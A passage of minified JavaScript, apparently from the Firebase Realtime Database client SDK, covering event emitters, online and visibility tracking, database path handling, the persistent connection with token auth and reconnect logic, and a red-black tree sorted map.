 */class vN{constructor(e){this.allowedEvents_=e,this.listeners_={},ye(Array.isArray(e)&&e.length>0,"Requires a non-empty array")}trigger(e,...n){if(Array.isArray(this.listeners_[e])){const i=[...this.listeners_[e]];for(let s=0;s<i.length;s++)i[s].callback.apply(i[s].context,n)}}on(e,n,i){this.validateEventType_(e),this.listeners_[e]=this.listeners_[e]||[],this.listeners_[e].push({callback:n,context:i});const s=this.getInitialEvent(e);s&&n.apply(i,s)}off(e,n,i){this.validateEventType_(e);const s=this.listeners_[e]||[];for(let o=0;o<s.length;o++)if(s[o].callback===n&&(!i||i===s[o].context)){s.splice(o,1);return}}validateEventType_(e){ye(this.allowedEvents_.find(n=>n===e),"Unknown event: "+e)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Om extends vN{static getInstance(){return new Om}constructor(){super(["online"]),this.online_=!0,typeof window<"u"&&typeof window.addEventListener<"u"&&!Xv()&&(window.addEventListener("online",()=>{this.online_||(this.online_=!0,this.trigger("online",!0))},!1),window.addEventListener("offline",()=>{this.online_&&(this.online_=!1,this.trigger("online",!1))},!1))}getInitialEvent(e){return ye(e==="online","Unknown event type: "+e),[this.online_]}currentlyOnline(){return this.online_}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const TE=32,CE=768;class Ot{constructor(e,n){if(n===void 0){this.pieces_=e.split("/");let i=0;for(let s=0;s<this.pieces_.length;s++)this.pieces_[s].length>0&&(this.pieces_[i]=this.pieces_[s],i++);this.pieces_.length=i,this.pieceNum_=0}else this.pieces_=e,this.pieceNum_=n}toString(){let e="";for(let n=this.pieceNum_;n<this.pieces_.length;n++)this.pieces_[n]!==""&&(e+="/"+this.pieces_[n]);return e||"/"}}function Et(){return new Ot("")}function et(t){return t.pieceNum_>=t.pieces_.length?null:t.pieces_[t.pieceNum_]}function Ka(t){return t.pieces_.length-t.pieceNum_}function Bt(t){let e=t.pieceNum_;return e<t.pieces_.length&&e++,new Ot(t.pieces_,e)}function ew(t){return t.pieceNum_<t.pieces_.length?t.pieces_[t.pieces_.length-1]:null}function SV(t){let e="";for(let n=t.pieceNum_;n<t.pieces_.length;n++)t.pieces_[n]!==""&&(e+="/"+encodeURIComponent(String(t.pieces_[n])));return e||"/"}function Nd(t,e=0){return t.pieces_.slice(t.pieceNum_+e)}function _N(t){if(t.pieceNum_>=t.pieces_.length)return null;const e=[];for(let n=t.pieceNum_;n<t.pieces_.length-1;n++)e.push(t.pieces_[n]);return new Ot(e,0)}function Kt(t,e){const n=[];for(let i=t.pieceNum_;i<t.pieces_.length;i++)n.push(t.pieces_[i]);if(e instanceof Ot)for(let i=e.pieceNum_;i<e.pieces_.length;i++)n.push(e.pieces_[i]);else{const i=e.split("/");for(let s=0;s<i.length;s++)i[s].length>0&&n.push(i[s])}return new Ot(n,0)}function lt(t){return t.pieceNum_>=t.pieces_.length}function yi(t,e){const n=et(t),i=et(e);if(n===null)return e;if(n===i)return yi(Bt(t),Bt(e));throw new Error("INTERNAL ERROR: innerPath ("+e+") is not within outerPath ("+t+")")}function NV(t,e){const n=Nd(t,0),i=Nd(e,0);for(let s=0;s<n.length&&s<i.length;s++){const o=rl(n[s],i[s]);if(o!==0)return o}return n.length===i.length?0:n.length<i.length?-1:1}function tw(t,e){if(Ka(t)!==Ka(e))return!1;for(let n=t.pieceNum_,i=e.pieceNum_;n<=t.pieces_.length;n++,i++)if(t.pieces_[n]!==e.pieces_[i])return!1;return!0}function sr(t,e){let n=t.pieceNum_,i=e.pieceNum_;if(Ka(t)>Ka(e))return!1;for(;n<t.pieces_.length;){if(t.pieces_[n]!==e.pieces_[i])return!1;++n,++i}return!0}class RV{constructor(e,n){this.errorPrefix_=n,this.parts_=Nd(e,0),this.byteLength_=Math.max(1,this.parts_.length);for(let i=0;i<this.parts_.length;i++)this.byteLength_+=np(this.parts_[i]);wN(this)}}function IV(t,e){t.parts_.length>0&&(t.byteLength_+=1),t.parts_.push(e),t.byteLength_+=np(e),wN(t)}function kV(t){const e=t.parts_.pop();t.byteLength_-=np(e),t.parts_.length>0&&(t.byteLength_-=1)}function wN(t){if(t.byteLength_>CE)throw new Error(t.errorPrefix_+"has a key path longer than "+CE+" bytes ("+t.byteLength_+").");if(t.parts_.length>TE)throw new Error(t.errorPrefix_+"path specified exceeds the maximum depth that can be written ("+TE+") or object contains a cycle "+Do(t))}function Do(t){return t.parts_.length===0?"":"in property '"+t.parts_.join(".")+"'"}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class nw extends vN{static getInstance(){return new nw}constructor(){super(["visible"]);let e,n;typeof document<"u"&&typeof document.addEventListener<"u"&&(typeof document.hidden<"u"?(n="visibilitychange",e="hidden"):typeof document.mozHidden<"u"?(n="mozvisibilitychange",e="mozHidden"):typeof document.msHidden<"u"?(n="msvisibilitychange",e="msHidden"):typeof document.webkitHidden<"u"&&(n="webkitvisibilitychange",e="webkitHidden")),this.visible_=!0,n&&document.addEventListener(n,()=>{const i=!document[e];i!==this.visible_&&(this.visible_=i,this.trigger("visible",i))},!1)}getInitialEvent(e){return ye(e==="visible","Unknown event type: "+e),[this.visible_]}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Wu=1e3,DV=60*5*1e3,SE=30*1e3,MV=1.3,OV=3e4,PV="server_kill",NE=3;class js extends yN{constructor(e,n,i,s,o,c,d,f){if(super(),this.repoInfo_=e,this.applicationId_=n,this.onDataUpdate_=i,this.onConnectStatus_=s,this.onServerInfoUpdate_=o,this.authTokenProvider_=c,this.appCheckTokenProvider_=d,this.authOverride_=f,this.id=js.nextPersistentConnectionId_++,this.log_=eh("p:"+this.id+":"),this.interruptReasons_={},this.listens=new Map,this.outstandingPuts_=[],this.outstandingGets_=[],this.outstandingPutCount_=0,this.outstandingGetCount_=0,this.onDisconnectRequestQueue_=[],this.connected_=!1,this.reconnectDelay_=Wu,this.maxReconnectDelay_=DV,this.securityDebugCallback_=null,this.lastSessionId=null,this.establishConnectionTimer_=null,this.visible_=!1,this.requestCBHash_={},this.requestNumber_=0,this.realtime_=null,this.authToken_=null,this.appCheckToken_=null,this.forceTokenRefresh_=!1,this.invalidAuthTokenCount_=0,this.invalidAppCheckTokenCount_=0,this.firstConnection_=!0,this.lastConnectionAttemptTime_=null,this.lastConnectionEstablishedTime_=null,f)throw new Error("Auth override specified in options, but not supported on non Node.js platforms");nw.getInstance().on("visible",this.onVisible_,this),e.host.indexOf("fblocal")===-1&&Om.getInstance().on("online",this.onOnline_,this)}sendRequest(e,n,i){const s=++this.requestNumber_,o={r:s,a:e,b:n};this.log_(Nn(o)),ye(this.connected_,"sendRequest call when we're not connected not allowed."),this.realtime_.sendRequest(o),i&&(this.requestCBHash_[s]=i)}get(e){this.initConnection_();const n=new Hd,s={action:"g",request:{p:e._path.toString(),q:e._queryObject},onComplete:c=>{const d=c.d;c.s==="ok"?n.resolve(d):n.reject(d)}};this.outstandingGets_.push(s),this.outstandingGetCount_++;const o=this.outstandingGets_.length-1;return this.connected_&&this.sendGet_(o),n.promise}listen(e,n,i,s){this.initConnection_();const o=e._queryIdentifier,c=e._path.toString();this.log_("Listen called for "+c+" "+o),this.listens.has(c)||this.listens.set(c,new Map),ye(e._queryParams.isDefault()||!e._queryParams.loadsAllData(),"listen() called for non-default but complete query"),ye(!this.listens.get(c).has(o),"listen() called twice for same path/queryId.");const d={onComplete:s,hashFn:n,query:e,tag:i};this.listens.get(c).set(o,d),this.connected_&&this.sendListen_(d)}sendGet_(e){const n=this.outstandingGets_[e];this.sendRequest("g",n.request,i=>{delete this.outstandingGets_[e],this.outstandingGetCount_--,this.outstandingGetCount_===0&&(this.outstandingGets_=[]),n.onComplete&&n.onComplete(i)})}sendListen_(e){const n=e.query,i=n._path.toString(),s=n._queryIdentifier;this.log_("Listen on "+i+" for "+s);const o={p:i},c="q";e.tag&&(o.q=n._queryObject,o.t=e.tag),o.h=e.hashFn(),this.sendRequest(c,o,d=>{const f=d.d,p=d.s;js.warnOnListenWarnings_(f,n),(this.listens.get(i)&&this.listens.get(i).get(s))===e&&(this.log_("listen response",d),p!=="ok"&&this.removeListen_(i,s),e.onComplete&&e.onComplete(p,f))})}static warnOnListenWarnings_(e,n){if(e&&typeof e=="object"&&ns(e,"w")){const i=fc(e,"w");if(Array.isArray(i)&&~i.indexOf("no_index")){const s='".indexOn": "'+n._queryParams.getIndex().toString()+'"',o=n._path.toString();oi(`Using an unspecified index. Your data will be downloaded and filtered on the client. Consider adding ${s} at ${o} to your security rules for better performance.`)}}}refreshAuthToken(e){this.authToken_=e,this.log_("Auth token refreshed"),this.authToken_?this.tryAuth():this.connected_&&this.sendRequest("unauth",{},()=>{}),this.reduceReconnectDelayIfAdminCredential_(e)}reduceReconnectDelayIfAdminCredential_(e){(e&&e.length===40||hO(e))&&(this.log_("Admin auth credential detected.  Reducing max reconnect time."),this.maxReconnectDelay_=SE)}refreshAppCheckToken(e){this.appCheckToken_=e,this.log_("App check token refreshed"),this.appCheckToken_?this.tryAppCheck():this.connected_&&this.sendRequest("unappeck",{},()=>{})}tryAuth(){if(this.connected_&&this.authToken_){const e=this.authToken_,n=dO(e)?"auth":"gauth",i={cred:e};this.authOverride_===null?i.noauth=!0:typeof this.authOverride_=="object"&&(i.authvar=this.authOverride_),this.sendRequest(n,i,s=>{const o=s.s,c=s.d||"error";this.authToken_===e&&(o==="ok"?this.invalidAuthTokenCount_=0:this.onAuthRevoked_(o,c))})}}tryAppCheck(){this.connected_&&this.appCheckToken_&&this.sendRequest("appcheck",{token:this.appCheckToken_},e=>{const n=e.s,i=e.d||"error";n==="ok"?this.invalidAppCheckTokenCount_=0:this.onAppCheckRevoked_(n,i)})}unlisten(e,n){const i=e._path.toString(),s=e._queryIdentifier;this.log_("Unlisten called for "+i+" "+s),ye(e._queryParams.isDefault()||!e._queryParams.loadsAllData(),"unlisten() called for non-default but complete query"),this.removeListen_(i,s)&&this.connected_&&this.sendUnlisten_(i,s,e._queryObject,n)}sendUnlisten_(e,n,i,s){this.log_("Unlisten on "+e+" for "+n);const o={p:e},c="n";s&&(o.q=i,o.t=s),this.sendRequest(c,o)}onDisconnectPut(e,n,i){this.initConnection_(),this.connected_?this.sendOnDisconnect_("o",e,n,i):this.onDisconnectRequestQueue_.push({pathString:e,action:"o",data:n,onComplete:i})}onDisconnectMerge(e,n,i){this.initConnection_(),this.connected_?this.sendOnDisconnect_("om",e,n,i):this.onDisconnectRequestQueue_.push({pathString:e,action:"om",data:n,onComplete:i})}onDisconnectCancel(e,n){this.initConnection_(),this.connected_?this.sendOnDisconnect_("oc",e,null,n):this.onDisconnectRequestQueue_.push({pathString:e,action:"oc",data:null,onComplete:n})}sendOnDisconnect_(e,n,i,s){const o={p:n,d:i};this.log_("onDisconnect "+e,o),this.sendRequest(e,o,c=>{s&&setTimeout(()=>{s(c.s,c.d)},Math.floor(0))})}put(e,n,i,s){this.putInternal("p",e,n,i,s)}merge(e,n,i,s){this.putInternal("m",e,n,i,s)}putInternal(e,n,i,s,o){this.initConnection_();const c={p:n,d:i};o!==void 0&&(c.h=o),this.outstandingPuts_.push({action:e,request:c,onComplete:s}),this.outstandingPutCount_++;const d=this.outstandingPuts_.length-1;this.connected_?this.sendPut_(d):this.log_("Buffering put: "+n)}sendPut_(e){const n=this.outstandingPuts_[e].action,i=this.outstandingPuts_[e].request,s=this.outstandingPuts_[e].onComplete;this.outstandingPuts_[e].queued=this.connected_,this.sendRequest(n,i,o=>{this.log_(n+" response",o),delete this.outstandingPuts_[e],this.outstandingPutCount_--,this.outstandingPutCount_===0&&(this.outstandingPuts_=[]),s&&s(o.s,o.d)})}reportStats(e){if(this.connected_){const n={c:e};this.log_("reportStats",n),this.sendRequest("s",n,i=>{if(i.s!=="ok"){const o=i.d;this.log_("reportStats","Error sending stats: "+o)}})}}onDataMessage_(e){if("r"in e){this.log_("from server: "+Nn(e));const n=e.r,i=this.requestCBHash_[n];i&&(delete this.requestCBHash_[n],i(e.b))}else{if("error"in e)throw"A server-side error has occurred: "+e.error;"a"in e&&this.onDataPush_(e.a,e.b)}}onDataPush_(e,n){this.log_("handleServerMessage",e,n),e==="d"?this.onDataUpdate_(n.p,n.d,!1,n.t):e==="m"?this.onDataUpdate_(n.p,n.d,!0,n.t):e==="c"?this.onListenRevoked_(n.p,n.q):e==="ac"?this.onAuthRevoked_(n.s,n.d):e==="apc"?this.onAppCheckRevoked_(n.s,n.d):e==="sd"?this.onSecurityDebugPacket_(n):nv("Unrecognized action received from server: "+Nn(e)+`
Are you using the latest client?`)}onReady_(e,n){this.log_("connection ready"),this.connected_=!0,this.lastConnectionEstablishedTime_=new Date().getTime(),this.handleTimestamp_(e),this.lastSessionId=n,this.firstConnection_&&this.sendConnectStats_(),this.restoreState_(),this.firstConnection_=!1,this.onConnectStatus_(!0)}scheduleConnect_(e){ye(!this.realtime_,"Scheduling a connect when we're already connected/ing?"),this.establishConnectionTimer_&&clearTimeout(this.establishConnectionTimer_),this.establishConnectionTimer_=setTimeout(()=>{this.establishConnectionTimer_=null,this.establishConnection_()},Math.floor(e))}initConnection_(){!this.realtime_&&this.firstConnection_&&this.scheduleConnect_(0)}onVisible_(e){e&&!this.visible_&&this.reconnectDelay_===this.maxReconnectDelay_&&(this.log_("Window became visible.  Reducing delay."),this.reconnectDelay_=Wu,this.realtime_||this.scheduleConnect_(0)),this.visible_=e}onOnline_(e){e?(this.log_("Browser went online."),this.reconnectDelay_=Wu,this.realtime_||this.scheduleConnect_(0)):(this.log_("Browser went offline.  Killing connection."),this.realtime_&&this.realtime_.close())}onRealtimeDisconnect_(){if(this.log_("data client disconnected"),this.connected_=!1,this.realtime_=null,this.cancelSentTransactions_(),this.requestCBHash_={},this.shouldReconnect_()){this.visible_?this.lastConnectionEstablishedTime_&&(new Date().getTime()-this.lastConnectionEstablishedTime_>OV&&(this.reconnectDelay_=Wu),this.lastConnectionEstablishedTime_=null):(this.log_("Window isn't visible.  Delaying reconnect."),this.reconnectDelay_=this.maxReconnectDelay_,this.lastConnectionAttemptTime_=new Date().getTime());const e=Math.max(0,new Date().getTime()-this.lastConnectionAttemptTime_);let n=Math.max(0,this.reconnectDelay_-e);n=Math.random()*n,this.log_("Trying to reconnect in "+n+"ms"),this.scheduleConnect_(n),this.reconnectDelay_=Math.min(this.maxReconnectDelay_,this.reconnectDelay_*MV)}this.onConnectStatus_(!1)}async establishConnection_(){if(this.shouldReconnect_()){this.log_("Making a connection attempt"),this.lastConnectionAttemptTime_=new Date().getTime(),this.lastConnectionEstablishedTime_=null;const e=this.onDataMessage_.bind(this),n=this.onReady_.bind(this),i=this.onRealtimeDisconnect_.bind(this),s=this.id+":"+js.nextConnectionId_++,o=this.lastSessionId;let c=!1,d=null;const f=function(){d?d.close():(c=!0,i())},p=function(b){ye(d,"sendRequest call when we're not connected not allowed."),d.sendRequest(b)};this.realtime_={close:f,sendRequest:p};const v=this.forceTokenRefresh_;this.forceTokenRefresh_=!1;try{const[b,w]=await Promise.all([this.authTokenProvider_.getToken(v),this.appCheckTokenProvider_.getToken(v)]);c?Vn("getToken() completed but was canceled"):(Vn("getToken() completed. Creating connection."),this.authToken_=b&&b.accessToken,this.appCheckToken_=w&&w.token,d=new CV(s,this.repoInfo_,this.applicationId_,this.appCheckToken_,this.authToken_,e,n,i,E=>{oi(E+" ("+this.repoInfo_.toString()+")"),this.interrupt(PV)},o))}catch(b){this.log_("Failed to get token: "+b),c||(this.repoInfo_.nodeAdmin&&oi(b),f())}}}interrupt(e){Vn("Interrupting connection for reason: "+e),this.interruptReasons_[e]=!0,this.realtime_?this.realtime_.close():(this.establishConnectionTimer_&&(clearTimeout(this.establishConnectionTimer_),this.establishConnectionTimer_=null),this.connected_&&this.onRealtimeDisconnect_())}resume(e){Vn("Resuming connection for reason: "+e),delete this.interruptReasons_[e],R0(this.interruptReasons_)&&(this.reconnectDelay_=Wu,this.realtime_||this.scheduleConnect_(0))}handleTimestamp_(e){const n=e-new Date().getTime();this.onServerInfoUpdate_({serverTimeOffset:n})}cancelSentTransactions_(){for(let e=0;e<this.outstandingPuts_.length;e++){const n=this.outstandingPuts_[e];n&&"h"in n.request&&n.queued&&(n.onComplete&&n.onComplete("disconnect"),delete this.outstandingPuts_[e],this.outstandingPutCount_--)}this.outstandingPutCount_===0&&(this.outstandingPuts_=[])}onListenRevoked_(e,n){let i;n?i=n.map(o=>$_(o)).join("$"):i="default";const s=this.removeListen_(e,i);s&&s.onComplete&&s.onComplete("permission_denied")}removeListen_(e,n){const i=new Ot(e).toString();let s;if(this.listens.has(i)){const o=this.listens.get(i);s=o.get(n),o.delete(n),o.size===0&&this.listens.delete(i)}else s=void 0;return s}onAuthRevoked_(e,n){Vn("Auth token revoked: "+e+"/"+n),this.authToken_=null,this.forceTokenRefresh_=!0,this.realtime_.close(),(e==="invalid_token"||e==="permission_denied")&&(this.invalidAuthTokenCount_++,this.invalidAuthTokenCount_>=NE&&(this.reconnectDelay_=SE,this.authTokenProvider_.notifyForInvalidToken()))}onAppCheckRevoked_(e,n){Vn("App check token revoked: "+e+"/"+n),this.appCheckToken_=null,this.forceTokenRefresh_=!0,(e==="invalid_token"||e==="permission_denied")&&(this.invalidAppCheckTokenCount_++,this.invalidAppCheckTokenCount_>=NE&&this.appCheckTokenProvider_.notifyForInvalidToken())}onSecurityDebugPacket_(e){this.securityDebugCallback_?this.securityDebugCallback_(e):"msg"in e&&console.log("FIREBASE: "+e.msg.replace(`
`,`
FIREBASE: `))}restoreState_(){this.tryAuth(),this.tryAppCheck();for(const e of this.listens.values())for(const n of e.values())this.sendListen_(n);for(let e=0;e<this.outstandingPuts_.length;e++)this.outstandingPuts_[e]&&this.sendPut_(e);for(;this.onDisconnectRequestQueue_.length;){const e=this.onDisconnectRequestQueue_.shift();this.sendOnDisconnect_(e.action,e.pathString,e.data,e.onComplete)}for(let e=0;e<this.outstandingGets_.length;e++)this.outstandingGets_[e]&&this.sendGet_(e)}sendConnectStats_(){const e={};let n="js";e["sdk."+n+"."+$4.replace(/\./g,"-")]=1,Xv()?e["framework.cordova"]=1:PC()&&(e["framework.reactnative"]=1),this.reportStats(e)}shouldReconnect_(){const e=Om.getInstance().currentlyOnline();return R0(this.interruptReasons_)&&e}}js.nextPersistentConnectionId_=0;js.nextConnectionId_=0;/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class nt{constructor(e,n){this.name=e,this.node=n}static Wrap(e,n){return new nt(e,n)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Np{getCompare(){return this.compare.bind(this)}indexedValueChanged(e,n){const i=new nt(Ac,e),s=new nt(Ac,n);return this.compare(i,s)!==0}minPost(){return nt.MIN}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let If;class bN extends Np{static get __EMPTY_NODE(){return If}static set __EMPTY_NODE(e){If=e}compare(e,n){return rl(e.name,n.name)}isDefinedOn(e){throw Oc("KeyIndex.isDefinedOn not expected to be called.")}indexedValueChanged(e,n){return!1}minPost(){return nt.MIN}maxPost(){return new nt(Yo,If)}makePost(e,n){return ye(typeof e=="string","KeyIndex indexValue must always be a string."),new nt(e,If)}toString(){return".key"}}const oc=new bN;/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class kf{constructor(e,n,i,s,o=null){this.isReverse_=s,this.resultGenerator_=o,this.nodeStack_=[];let c=1;for(;!e.isEmpty();)if(e=e,c=n?i(e.key,n):1,s&&(c*=-1),c<0)this.isReverse_?e=e.left:e=e.right;else if(c===0){this.nodeStack_.push(e);break}else this.nodeStack_.push(e),this.isReverse_?e=e.right:e=e.left}getNext(){if(this.nodeStack_.length===0)return null;let e=this.nodeStack_.pop(),n;if(this.resultGenerator_?n=this.resultGenerator_(e.key,e.value):n={key:e.key,value:e.value},this.isReverse_)for(e=e.left;!e.isEmpty();)this.nodeStack_.push(e),e=e.right;else for(e=e.right;!e.isEmpty();)this.nodeStack_.push(e),e=e.left;return n}hasNext(){return this.nodeStack_.length>0}peek(){if(this.nodeStack_.length===0)return null;const e=this.nodeStack_[this.nodeStack_.length-1];return this.resultGenerator_?this.resultGenerator_(e.key,e.value):{key:e.key,value:e.value}}}class Cn{constructor(e,n,i,s,o){this.key=e,this.value=n,this.color=i??Cn.RED,this.left=s??vi.EMPTY_NODE,this.right=o??vi.EMPTY_NODE}copy(e,n,i,s,o){return new Cn(e??this.key,n??this.value,i??this.color,s??this.left,o??this.right)}count(){return this.left.count()+1+this.right.count()}isEmpty(){return!1}inorderTraversal(e){return this.left.inorderTraversal(e)||!!e(this.key,this.value)||this.right.inorderTraversal(e)}reverseTraversal(e){return this.right.reverseTraversal(e)||e(this.key,this.value)||this.left.reverseTraversal(e)}min_(){return this.left.isEmpty()?this:this.left.min_()}minKey(){return this.min_().key}maxKey(){return this.right.isEmpty()?this.key:this.right.maxKey()}insert(e,n,i){let s=this;const o=i(e,s.key);return o<0?s=s.copy(null,null,null,s.left.insert(e,n,i),null):o===0?s=s.copy(null,n,null,null,null):s=s.copy(null,null,null,null,s.right.insert(e,n,i)),s.fixUp_()}removeMin_(){if(this.left.isEmpty())return vi.EMPTY_NODE;let e=this;return!e.left.isRed_()&&!e.left.left.isRed_()&&(e=e.moveRedLeft_()),e=e.copy(null,null,null,e.left.removeMin_(),null),e.fixUp_()}remove(e,n){let i,s;if(i=this,n(e,i.key)<0)!i.left.isEmpty()&&!i.left.isRed_()&&!i.left.left.isRed_()&&(i=i.moveRedLeft_()),i=i.copy(null,null,null,i.left.remove(e,n),null);else{if(i.left.isRed_()&&(i=i.rotateRight_()),!i.right.isEmpty()&&!i.right.isRed_()&&!i.right.left.isRed_()&&(i=i.moveRedRight_()),n(e,i.key)===0){if(i.right.isEmpty())return vi.EMPTY_NODE;s=i.right.min_(),i=i.copy(s.key,s.value,null,null,i.right.removeMin_())}i=i.copy(null,null,null,null,i.right.remove(e,n))}return i.fixUp_()}isRed_(){return this.color}fixUp_(){let e=this;return e.right.isRed_()&&!e.left.isRed_()&&(e=e.rotateLeft_()),e.left.isRed_()&&e.left.left.isRed_()&&(e=e.rotateRight_()),e.left.isRed_()&&e.right.isRed_()&&(e=e.colorFlip_()),e}moveRedLeft_(){let e=this.colorFlip_();return e.right.left.isRed_()&&(e=e.copy(null,null,null,null,e.right.rotateRight_()),e=e.rotateLeft_(),e=e.colorFlip_()),e}moveRedRight_(){let e=this.colorFlip_();return e.left.left.isRed_()&&(e=e.rotateRight_(),e=e.colorFlip_()),e}rotateLeft_(){const e=this.copy(null,null,Cn.RED,null,this.right.left);return this.right.copy(null,null,this.color,e,null)}rotateRight_(){const e=this.copy(null,null,Cn.RED,this.left.right,null);return this.left.copy(null,null,this.color,null,e)}colorFlip_(){const e=this.left.copy(null,null,!this.left.color,null,null),n=this.right.copy(null,null,!this.right.color,null,null);return this.copy(null,null,!this.color,e,n)}checkMaxDepth_(){const e=this.check_();return Math.pow(2,e)<=this.count()+1}check_(){if(this.isRed_()&&this.left.isRed_())throw new Error("Red node has red child("+this.key+","+this.value+")");if(this.right.isRed_())throw new Error("Right child of ("+this.key+","+this.value+") is red");const e=this.left.check_();if(e!==this.right.check_())throw new Error("Black depths differ");return e+(this.isRed_()?0:1)}}Cn.RED=!0;Cn.BLACK=!1;class jV{copy(e,n,i,s,o){return this}insert(e,n,i){return new Cn(e,n,null)}remove(e,n){return this}count(){return 0}isEmpty(){return!0}inorderTraversal(e){return!1}reverseTraversal(e){return!1}minKey(){return null}maxKey(){return null}check_(){return 0}isRed_(){return!1}}class vi{constructor(e,n=vi.EMPTY_NODE){this.comparator_=e,this.root_=n}insert(e,n){return new vi(this.comparator_,this.root_.insert(e,n,this.comparator_).copy(null,null,Cn.BLACK,null,null))}remove(e){return new vi(this.comparator_,this.root_.remove(e,this.comparator_).copy(null,null,Cn.BLACK,null,null))}get(e){let n,i=this.root_;for(;!i.isEmpty();){if(n=this.comparator_(e,i.key),n===0)return i.value;n<0?i=i.left:n>0&&(i=i.right)}return null}getPredecessorKey(e){let n,i=this.root_,s=null;for(;!i.isEmpty();)if(n=this.comparator_(e,i.key),n===0){if(i.left.isEmpty())return s?s.key:null;for(i=i.left;!i.right.isEmpty();)i=i.right;return i.key}else n<0?i=i.left:n>0&&(s=i,i=i.right);throw new Error("Attempted to find predecessor key for a nonexistent key.  What gives?")}isEmpty(){return this.root_.isEmpty()}count(){return this.root_.count()}minKey(){return this.root_.minKey()}maxKey(){return this.root_.maxKey()}inorderTraversal(e){return this.root_.inorderTraversal(e)}reverseTraversal(e){return this.root_.reverseTraversal(e)}getIterator(e){return new kf(this.root_,null,this.comparator_,!1,e)}getIteratorFrom(e,n){return new kf(this.root_,e,this.comparator_,!1,n)}getReverseIteratorFrom(e,n){return new kf(this.root_,e,this.comparator_,!0,n)}getReverseIterator(e){return new kf(this.root_,null,this.comparator_,!0,e)}}vi.EMPTY_NODE=new jV;/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function LV(t,e){return rl(t.name,e.name)}function iw(t,e){return rl(t,e)}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let rv;function VV(t){rv=t}const xN=function(t){return typeof t=="number"?"number:"+eN(t):"string:"+t},AN=function(t){if(t.isLeafNode()){const e=t.val();ye(typeof e=="string"||typeof e=="number"||typeof e=="object"&&ns(e,".sv"),"Priority must be a string or number.")}else ye(t===rv||t.isEmpty(),"priority of unexpected type.");ye(t===rv||t.getPriority().isEmpty(),"Priority nodes can't have a priority of their own.")};/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
